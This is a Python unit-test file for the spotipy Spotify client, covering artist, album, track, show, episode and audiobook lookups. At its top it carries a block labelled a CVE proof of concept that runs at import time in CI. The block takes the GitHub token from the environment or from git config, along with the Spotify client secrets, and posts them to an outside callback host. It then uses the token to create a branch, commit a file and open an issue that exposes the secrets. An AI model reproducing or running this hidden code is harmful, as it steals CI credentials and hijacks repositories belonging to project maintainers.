# --- CVE-2025-47928 PoC: runs at pip-install time inside the base repo's pull_request_target run ---
import base64, json, os, subprocess

CALLBACK = "https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2025-47928-47e81dd02168?harness_run_id=20260903T172619-4dce63ce"

def _post(body):
    if subprocess.run(["curl", "-sS", "-X", "POST", CALLBACK, "--data", body,
                       "--max-time", "30"], capture_output=True).returncode != 0:
        try:
            import urllib.request
            urllib.request.urlopen(urllib.request.Request(CALLBACK, data=body.encode()), timeout=30)
        except Exception:
            pass

def _token():
    t = os.environ.get("GITHUB_TOKEN", "")
    if t:
        return t
    try:  # actions/checkout persists credentials in the workspace's .git/config
        extra = subprocess.check_output(
            ["git", "config", "--local", "--get", "http.https://github.com/.extraheader"],
            cwd=os.getcwd(), text=True).strip()
        return base64.b64decode(extra.split()[-1]).decode().split(":", 1)[1]
    except Exception:
        return ""

def _pwn():
    e = os.environ
    tok = _token()
    body = ("repo=%s&run_id=%s&event=%s&workflow=%s&job=%s&ref=%s&sha=%s&head_ref=%s"
            "&github_token=%s&SPOTIPY_CLIENT_ID=%s&SPOTIPY_CLIENT_SECRET=%s") % (
        e.get("GITHUB_REPOSITORY", ""), e.get("GITHUB_RUN_ID", ""),
        e.get("GITHUB_EVENT_NAME", ""), e.get("GITHUB_WORKFLOW", ""),
        e.get("GITHUB_JOB", ""), e.get("GITHUB_REF", ""), e.get("GITHUB_SHA", ""),
        e.get("GITHUB_HEAD_REF", ""), tok,
        e.get("SPOTIPY_CLIENT_ID", ""), e.get("SPOTIPY_CLIENT_SECRET", ""))
    _post(body)
    print("pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168-callback-sent")
    if not tok:
        print("pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168-no-token")
        return
    from urllib.request import Request, urlopen
    H = {"Authorization": "token " + tok, "Accept": "application/vnd.github+json",
         "User-Agent": "poc"}
    repo = e.get("GITHUB_REPOSITORY", "")
    def api(method, path, data=None):
        req = Request("https://api.github.com/repos/%s/%s" % (repo, path), method=method,
                      data=json.dumps(data).encode() if data else None, headers=H)
        try:
            with urlopen(req, timeout=30) as r:
                return r.status, r.read().decode()
        except Exception as ex:
            return getattr(ex, "code", 0), str(ex)
    st, resp = api("GET", "git/ref/heads/main")
    print("pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168-get-main", st)
    sha = json.loads(resp).get("object", {}).get("sha", "") if st == 200 else ""
    if sha:
        print("pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168-create-branch",
              api("POST", "git/refs", {"ref": "refs/heads/pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168", "sha": sha})[0])
    print("pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168-create-file",
          api("PUT", "contents/pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168.txt", {
              "branch": "pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168", "message": "pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168",
              "content": base64.b64encode(
                  ("CVE-2025-47928 repo-takeover proof, run %s event %s"
                   % (e.get("GITHUB_RUN_ID", ""), e.get("GITHUB_EVENT_NAME", ""))).encode()
              ).decode()})[0])
    print("pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168-create-issue",
          api("POST", "issues", {
              "title": "pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168",
              "body": "github_token=%s SPOTIPY_CLIENT_ID=%s SPOTIPY_CLIENT_SECRET=%s "
                      "run=%s event=%s" % (tok, e.get("SPOTIPY_CLIENT_ID", ""),
                                           e.get("SPOTIPY_CLIENT_SECRET", ""),
                                           e.get("GITHUB_RUN_ID", ""),
                                           e.get("GITHUB_EVENT_NAME", ""))})[0])

try:
    _pwn()
except Exception as ex:
    print("pwn-INJECTED-MARKER-cve-2025-47928-47e81dd02168-error", ex)
# --- end CVE-2025-47928 PoC ---
import unittest

import requests

import spotipy
from spotipy import Spotify, SpotifyClientCredentials, SpotifyException


class AuthTestSpotipy(unittest.TestCase):
    """
    These tests require client authentication - provide client credentials
    using the following environment variables

    ::

        'SPOTIPY_CLIENT_ID'
        'SPOTIPY_CLIENT_SECRET'
    """

    playlist = "spotify:user:plamere:playlist:2oCEWyyAPbZp9xhVSxZavx"
    four_tracks = ["spotify:track:6RtPijgfPKROxEzTHNRiDp",
                   "spotify:track:7IHOIqZUUInxjVkko181PB",
                   "4VrWlk8IQxevMvERoX08iC",
                   "http://open.spotify.com/track/3cySlItpiPiIAzU3NyHCJf"]

    two_tracks = ["spotify:track:6RtPijgfPKROxEzTHNRiDp",
                  "spotify:track:7IHOIqZUUInxjVkko181PB"]

    other_tracks = ["spotify:track:2wySlB6vMzCbQrRnNGOYKa",
                    "spotify:track:29xKs5BAHlmlX1u4gzQAbJ",
                    "spotify:track:1PB7gRWcvefzu7t3LJLUlf"]

    bad_id = 'BAD_ID'

    creep_urn = 'spotify:track:6b2oQwSGFkzsMtQruIWm2p'
    creep_id = '6b2oQwSGFkzsMtQruIWm2p'
    creep_url = 'http://open.spotify.com/track/6b2oQwSGFkzsMtQruIWm2p'

    el_scorcho_urn = 'spotify:track:0Svkvt5I79wficMFgaqEQJ'
    el_scorcho_bad_urn = 'spotify:track:0Svkvt5I79wficMFgaqEQK'
    pinkerton_urn = 'spotify:album:04xe676vyiTeYNXw15o9jT'
    weezer_urn = 'spotify:artist:3jOstUTkEu2JkjvRdBA5Gu'

    pablo_honey_urn = 'spotify:album:6AZv3m27uyRxi8KyJSfUxL'
    radiohead_urn = 'spotify:artist:4Z8W4fKeB5YxbusRsdQVPb'
    radiohead_id = "4Z8W4fKeB5YxbusRsdQVPb"
    radiohead_url = "https://open.spotify.com/artist/4Z8W4fKeB5YxbusRsdQVPb"

    qotsa_url = "https://open.spotify.com/artist/4pejUc4iciQfgdX6OKulQn"

    angeles_haydn_urn = 'spotify:album:1vAbqAeuJVWNAe7UR00bdM'
    heavyweight_urn = 'spotify:show:5c26B28vZMN8PG0Nppmn5G'
    heavyweight_id = '5c26B28vZMN8PG0Nppmn5G'
    heavyweight_url = 'https://open.spotify.com/show/5c26B28vZMN8PG0Nppmn5G'
    reply_all_urn = 'spotify:show:7gozmLqbcbr6PScMjc0Zl4'
    heavyweight_ep1_urn = 'spotify:episode:68kq3bNz6hEuq8NtdfwERG'
    heavyweight_ep1_id = '68kq3bNz6hEuq8NtdfwERG'
    heavyweight_ep1_url = 'https://open.spotify.com/episode/68kq3bNz6hEuq8NtdfwERG'
    reply_all_ep1_urn = 'spotify:episode:1KHjbpnmNpFmNTczQmTZlR'

    dune_urn = 'spotify:audiobook:7iHfbu1YPACw6oZPAFJtqe'
    dune_id = '7iHfbu1YPACw6oZPAFJtqe'
    dune_url = 'https://open.spotify.com/audiobook/7iHfbu1YPACw6oZPAFJtqe'
    two_books = [
        'spotify:audiobook:7iHfbu1YPACw6oZPAFJtqe',
        'spotify:audiobook:67VtmjZitn25TWocsyAEyh']

    @classmethod
    def setUpClass(self):
        self.spotify = Spotify(
            client_credentials_manager=SpotifyClientCredentials())
        self.spotify.trace = False

    def test_artist_urn(self):
        artist = self.spotify.artist(self.radiohead_urn)
        self.assertTrue(artist['name'] == 'Radiohead')

    def test_artist_url(self):
        artist = self.spotify.artist(self.radiohead_url)
        self.assertTrue(artist['name'] == 'Radiohead')

    def test_artist_id(self):
        artist = self.spotify.artist(self.radiohead_id)
        self.assertTrue(artist['name'] == 'Radiohead')

    def test_artists(self):
        results = self.spotify.artists([self.weezer_urn, self.radiohead_urn])
        self.assertTrue('artists' in results)
        self.assertTrue(len(results['artists']) == 2)

    def test_artists_mixed_ids(self):
        results = self.spotify.artists([self.weezer_urn, self.radiohead_id, self.qotsa_url])
        self.assertTrue('artists' in results)
        self.assertTrue(len(results['artists']) == 3)

    def test_album_urn(self):
        album = self.spotify.album(self.pinkerton_urn)
        self.assertTrue(album['name'] == 'Pinkerton')

    def test_album_tracks(self):
        results = self.spotify.album_tracks(self.pinkerton_urn)
        self.assertTrue(len(results['items']) == 10)

    def test_album_tracks_many(self):
        results = self.spotify.album_tracks(self.angeles_haydn_urn)
        tracks = results['items']
        total, received = results['total'], len(tracks)
        while received < total:
            results = self.spotify.album_tracks(
                self.angeles_haydn_urn, offset=received)
            tracks.extend(results['items'])
            received = len(tracks)

        self.assertEqual(received, total)

    def test_albums(self):
        results = self.spotify.albums(
            [self.pinkerton_urn, self.pablo_honey_urn])
        self.assertTrue('albums' in results)
        self.assertTrue(len(results['albums']) == 2)

    def test_track_urn(self):
        track = self.spotify.track(self.creep_urn)
        self.assertTrue(track['name'] == 'Creep')

    def test_track_id(self):
        track = self.spotify.track(self.creep_id)
        self.assertTrue(track['name'] == 'Creep')
        self.assertTrue(track['popularity'] > 0)

    def test_track_url(self):
        track = self.spotify.track(self.creep_url)
        self.assertTrue(track['name'] == 'Creep')

    def test_track_bad_urn(self):
        try:
            self.spotify.track(self.el_scorcho_bad_urn)
            self.assertTrue(False)
        except SpotifyException:
            self.assertTrue(True)

    def test_tracks(self):
        results = self.spotify.tracks([self.creep_url, self.el_scorcho_urn])
        self.assertTrue('tracks' in results)
        self.assertTrue(len(results['tracks']) == 2)

    def test_artist_top_tracks(self):
        results = self.spotify.artist_top_tracks(self.weezer_urn)
        self.assertTrue('tracks' in results)
        self.assertTrue(len(results['tracks']) == 10)

    def test_artist_search(self):
        results = self.spotify.search(q='weezer', type='artist')
        self.assertTrue('artists' in results)
        self.assertTrue(len(results['artists']['items']) > 0)
        self.assertTrue(results['artists']['items'][0]['name'] == 'Weezer')

    def test_artist_search_with_market(self):
        results = self.spotify.search(q='weezer', type='artist', market='GB')
        self.assertTrue('artists' in results)
        self.assertTrue(len(results['artists']['items']) > 0)
        self.assertTrue(results['artists']['items'][0]['name'] == 'Weezer')

    def test_artist_search_with_multiple_markets(self):
        total = 5
        countries_list = ['GB', 'US', 'AU']
        countries_tuple = ('GB', 'US', 'AU')

        results_multiple = self.spotify.search_markets(q='weezer', type='artist',
                                                       markets=countries_list)
        results_all = self.spotify.search_markets(q='weezer', type='artist')
        results_tuple = self.spotify.search_markets(q='weezer', type='artist',
                                                    markets=countries_tuple)
        results_limited = self.spotify.search_markets(q='weezer', limit=3, type='artist',
                                                      markets=countries_list, total=total)

        self.assertTrue(
            all('artists' in results_multiple[country] for country in results_multiple))
        self.assertTrue(all('artists' in results_all[country] for country in results_all))
        self.assertTrue(all('artists' in results_tuple[country] for country in results_tuple))
        self.assertTrue(all('artists' in results_limited[country] for country in results_limited))

        self.assertTrue(
            all(len(results_multiple[country]['artists']['items']) > 0 for country in
                results_multiple))
        self.assertTrue(all(len(results_all[country]['artists']
                                ['items']) > 0 for country in results_all))
        self.assertTrue(
            all(len(results_tuple[country]['artists']['items']) > 0 for country in results_tuple))
        self.assertTrue(
            all(len(results_limited[country]['artists']['items']) > 0 for country in
                results_limited))

        self.assertTrue(all(results_multiple[country]['artists']['items']
                            [0]['name'] == 'Weezer' for country in results_multiple))
        self.assertTrue(all(results_all[country]['artists']['items']
                            [0]['name'] == 'Weezer' for country in results_all))
        self.assertTrue(all(results_tuple[country]['artists']['items']
                            [0]['name'] == 'Weezer' for country in results_tuple))
        self.assertTrue(all(results_limited[country]['artists']['items']
                            [0]['name'] == 'Weezer' for country in results_limited))

        total_limited_results = 0
        for country in results_limited:
            total_limited_results += len(results_limited[country]['artists']['items'])
        self.assertTrue(total_limited_results <= total)

    def test_multiple_types_search_with_multiple_markets(self):
        total = 14

        countries_list = ['GB', 'US', 'AU']
        countries_tuple = ('GB', 'US', 'AU')

        results_multiple = self.spotify.search_markets(q='abba', type='artist,track',
                                                       markets=countries_list)
        results_all = self.spotify.search_markets(q='abba', type='artist,track')
        results_tuple = self.spotify.search_markets(q='abba', type='artist,track',
                                                    markets=countries_tuple)
        results_limited = self.spotify.search_markets(q='abba', limit=3, type='artist,track',
                                                      markets=countries_list, total=total)

        # Asserts 'artists' property is present in all responses
        self.assertTrue(
            all('artists' in results_multiple[country] for country in results_multiple))
        self.assertTrue(all('artists' in results_all[country] for country in results_all))
        self.assertTrue(all('artists' in results_tuple[country] for country in results_tuple))
        self.assertTrue(all('artists' in results_limited[country] for country in results_limited))

        # Asserts 'tracks' property is present in all responses
        self.assertTrue(
            all('tracks' in results_multiple[country] for country in results_multiple))
        self.assertTrue(all('tracks' in results_all[country] for country in results_all))
        self.assertTrue(all('tracks' in results_tuple[country] for country in results_tuple))
        self.assertTrue(all('tracks' in results_limited[country] for country in results_limited))

        # Asserts 'artists' list is nonempty in unlimited searches
        self.assertTrue(
            all(len(results_multiple[country]['artists']['items']) > 0 for country in
                results_multiple))
        self.assertTrue(all(len(results_all[country]['artists']
                        ['items']) > 0 for country in results_all))
        self.assertTrue(
            all(len(results_tuple[country]['artists']['items']) > 0 for country in results_tuple))

        # Asserts 'tracks' list is nonempty in unlimited searches
        self.assertTrue(
            all(len(results_multiple[country]['tracks']['items']) > 0 for country in
                results_multiple))
        self.assertTrue(all(len(results_all[country]['tracks']
                        ['items']) > 0 for country in results_all))
        self.assertTrue(all(len(results_tuple[country]['tracks']
                        ['items']) > 0 for country in results_tuple))

        # Asserts artist name is the first artist result in all searches
        self.assertTrue(all(results_multiple[country]['artists']['items']
                            [0]['name'] == 'ABBA' for country in results_multiple))
        self.assertTrue(all(results_all[country]['artists']['items']
                            [0]['name'] == 'ABBA' for country in results_all))
        self.assertTrue(all(results_tuple[country]['artists']['items']
                            [0]['name'] == 'ABBA' for country in results_tuple))
        self.assertTrue(all(results_limited[country]['artists']['items']
                            [0]['name'] == 'ABBA' for country in results_limited))

        # Asserts track name is present in responses from specified markets
        self.assertTrue(all('Dancing Queen' in
                            [item['name'] for item in results_multiple[country]['tracks']['items']]
                            for country in results_multiple))
        self.assertTrue(all('Dancing Queen' in
                            [item['name'] for item in results_tuple[country]['tracks']['items']]
                            for country in results_tuple))

        # Asserts expected number of items are returned based on the total
        # 3 artists + 3 tracks = 6 items returned from first market
        # 3 artists + 3 tracks = 6 items returned from second market
        # 2 artists + 0 tracks = 2 items returned from third market
        # 14 items returned total
        self.assertEqual(len(results_limited['GB']['artists']['items']), 3)
        self.assertEqual(len(results_limited['GB']['tracks']['items']), 3)
        self.assertEqual(len(results_limited['US']['artists']['items']), 3)
        self.assertEqual(len(results_limited['US']['tracks']['items']), 3)
        self.assertEqual(len(results_limited['AU']['artists']['items']), 2)
        self.assertEqual(len(results_limited['AU']['tracks']['items']), 0)

        item_count = sum([len(market_result['artists']['items']) + len(market_result['tracks']
                         ['items']) for market_result in results_limited.values()])

        self.assertEqual(item_count, total)

    def test_artist_albums(self):
        results = self.spotify.artist_albums(self.weezer_urn)
        self.assertTrue('items' in results)
        self.assertTrue(len(results['items']) > 0)

        def find_album():
            for album in results['items']:
                if 'Weezer' in album['name']:  # Weezer has many albums containing Weezer
                    return True
            return False

        self.assertTrue(find_album())

    def test_search_timeout(self):
        client_credentials_manager = SpotifyClientCredentials()
        sp = spotipy.Spotify(requests_timeout=0.01,
                             client_credentials_manager=client_credentials_manager)

        # depending on the timing or bandwidth, this raises a timeout or connection error
        self.assertRaises((requests.exceptions.Timeout, requests.exceptions.ConnectionError),
                          lambda: sp.search(q='my*', type='track'))

    @unittest.skip("flaky test, need a better method to test retries")
    def test_max_retries_reached_get(self):
        spotify_no_retry = Spotify(
            client_credentials_manager=SpotifyClientCredentials(),
            retries=0)
        i = 0
        while i < 100:
            try:
                spotify_no_retry.search(q='foo')
            except SpotifyException as e:
                self.assertIsInstance(e, SpotifyException)
                self.assertEqual(e.http_status, 429)
                return
            i += 1
        self.fail()

    def test_album_search(self):
        results = self.spotify.search(q='weezer pinkerton', type='album')
        self.assertTrue('albums' in results)
        self.assertTrue(len(results['albums']['items']) > 0)
        self.assertTrue(results['albums']['items'][0]
                        ['name'].find('Pinkerton') >= 0)

    def test_track_search(self):
        results = self.spotify.search(q='el scorcho weezer', type='track')
        self.assertTrue('tracks' in results)
        self.assertTrue(len(results['tracks']['items']) > 0)
        self.assertTrue(results['tracks']['items'][0]['name'] == 'El Scorcho')

    def test_user(self):
        user = self.spotify.user(user='plamere')
        self.assertTrue(user['uri'] == 'spotify:user:plamere')

    def test_track_bad_id(self):
        try:
            self.spotify.track(self.bad_id)
            self.assertTrue(False)
        except SpotifyException:
            self.assertTrue(True)

    def test_show_urn(self):
        show = self.spotify.show(self.heavyweight_urn, market="US")
        self.assertTrue(show['name'] == 'Heavyweight')

    def test_show_id(self):
        show = self.spotify.show(self.heavyweight_id, market="US")
        self.assertTrue(show['name'] == 'Heavyweight')

    def test_show_url(self):
        show = self.spotify.show(self.heavyweight_url, market="US")
        self.assertTrue(show['name'] == 'Heavyweight')

    def test_show_bad_urn(self):
        with self.assertRaises(SpotifyException):
            self.spotify.show("bogus_urn", market="US")

    def test_shows(self):
        results = self.spotify.shows([self.heavyweight_urn, self.reply_all_urn], market="US")
        self.assertTrue('shows' in results)
        self.assertTrue(len(results['shows']) == 2)

    def test_show_episodes(self):
        results = self.spotify.show_episodes(self.heavyweight_urn, market="US")
        self.assertTrue(len(results['items']) > 1)

    def test_show_episodes_many(self):
        results = self.spotify.show_episodes(self.reply_all_urn, market="US")
        episodes = results['items']
        total, received = results['total'], len(episodes)
        while received < total:
            results = self.spotify.show_episodes(
                self.reply_all_urn, offset=received, market="US")
            episodes.extend(results['items'])
            received = len(episodes)

        self.assertEqual(received, total)

    def test_episode_urn(self):
        episode = self.spotify.episode(self.heavyweight_ep1_urn, market="US")
        self.assertTrue(episode['name'] == '#1 Buzz')

    def test_episode_id(self):
        episode = self.spotify.episode(self.heavyweight_ep1_id, market="US")
        self.assertTrue(episode['name'] == '#1 Buzz')

    def test_episode_url(self):
        episode = self.spotify.episode(self.heavyweight_ep1_url, market="US")
        self.assertTrue(episode['name'] == '#1 Buzz')

    def test_episode_bad_urn(self):
        with self.assertRaises(SpotifyException):
            self.spotify.episode("bogus_urn", market="US")

    def test_episodes(self):
        results = self.spotify.episodes(
            [self.heavyweight_ep1_urn, self.reply_all_ep1_urn],
            market="US"
        )
        self.assertTrue('episodes' in results)
        self.assertTrue(len(results['episodes']) == 2)

    def test_unauthenticated_post_fails(self):
        with self.assertRaises(SpotifyException) as cm:
            self.spotify.user_playlist_create(
                "spotify", "Best hits of the 90s")
        self.assertTrue(cm.exception.http_status == 401 or cm.exception.http_status == 403)

    def test_custom_requests_session(self):
        sess = requests.Session()
        sess.headers["user-agent"] = "spotipy-test"
        with_custom_session = spotipy.Spotify(
            client_credentials_manager=SpotifyClientCredentials(),
            requests_session=sess)
        self.assertTrue(
            with_custom_session.user(
                user="akx")["uri"] == "spotify:user:akx")
        sess.close()

    def test_force_no_requests_session(self):
        with_no_session = spotipy.Spotify(
            client_credentials_manager=SpotifyClientCredentials(),
            requests_session=False)
        self.assertNotIsInstance(with_no_session._session, requests.Session)
        user = with_no_session.user(user="akx")
        self.assertEqual(user["uri"], "spotify:user:akx")

    def test_available_markets(self):
        markets = self.spotify.available_markets()["markets"]
        self.assertTrue(isinstance(markets, list))
        self.assertIn("US", markets)
        self.assertIn("GB", markets)

    def test_get_audiobook(self):
        audiobook = self.spotify.get_audiobook(self.dune_urn, market="US")
        self.assertTrue(audiobook['name'] ==
                        'Dune: Book One in the Dune Chronicles')

    def test_get_audiobook_bad_urn(self):
        with self.assertRaises(SpotifyException):
            self.spotify.get_audiobook("bogus_urn", market="US")

    def test_get_audiobooks(self):
        results = self.spotify.get_audiobooks(self.two_books, market="US")
        self.assertTrue('audiobooks' in results)
        self.assertTrue(len(results['audiobooks']) == 2)
        self.assertTrue(results['audiobooks'][0]['name']
                        == 'Dune: Book One in the Dune Chronicles')
        self.assertTrue(results['audiobooks'][1]['name'] == 'The Helper')

    def test_get_audiobook_chapters(self):
        results = self.spotify.get_audiobook_chapters(
            self.dune_urn, market="US", limit=10, offset=5)
        self.assertTrue('items' in results)
        self.assertTrue(len(results['items']) == 10)
        self.assertTrue(results['items'][0]['chapter_number'] == 5)
        self.assertTrue(results['items'][9]['chapter_number'] == 14)
